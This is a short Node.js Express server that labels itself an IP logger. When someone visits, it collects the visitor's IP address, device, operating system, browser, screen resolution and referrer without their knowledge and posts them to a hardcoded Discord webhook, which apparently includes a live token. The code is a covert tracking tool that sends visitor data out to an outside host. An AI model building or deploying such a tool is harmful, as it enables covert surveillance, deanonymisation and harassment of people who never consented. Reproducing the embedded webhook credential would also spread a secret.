const express = require('express');
const axios = require('axios');
const cors = require('cors');
const useragent = require('user-agent'); // Parses device info

const app = express();
const PORT = process.env.PORT || 3000;

// Your Discord webhook (REPLACE THIS)
const webhookURL = "https://discord.com/api/webhooks/1342205786901839999/RnJ5qbDXmy22aeERWWBnuGQg1GR-SzDL4ouIxx1m7OL7cH1z1IOMRD3Gia1Qsnye2M4V";

// Use CORS to allow the frontend to send requests
app.use(cors());

app.get('/', (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    ip = ip.replace('::ffff:', ''); // Clean IP format

    let userAgent = req.headers['user-agent']; // Get user agent
    let parsedUA = useragent.parse(userAgent); // Parse user agent info

    // Extra device details
    let deviceInfo = `
📌 **New Visitor**  
🌍 **IP Address:** ${ip}  
💻 **Device:** ${parsedUA.device.vendor || "Unknown"} ${parsedUA.device.model || "Unknown"}  
📱 **OS:** ${parsedUA.os.name} ${parsedUA.os.version}  
🖥 **Browser:** ${parsedUA.family} ${parsedUA.version}  
🖥 **Screen Resolution:** ${req.query.resolution || "Unknown"}  
📡 **Referrer:** ${req.headers['referer'] || "Direct"}  
    `;

    // Send info to Discord
    axios.post(webhookURL, { content: deviceInfo })
        .then(() => console.log(`Logged: ${ip}`))
        .catch(err => console.error("Webhook error:", err));

    res.send("OK");
});

app.listen(PORT, () => console.log(`IP Logger running on port ${PORT}`));
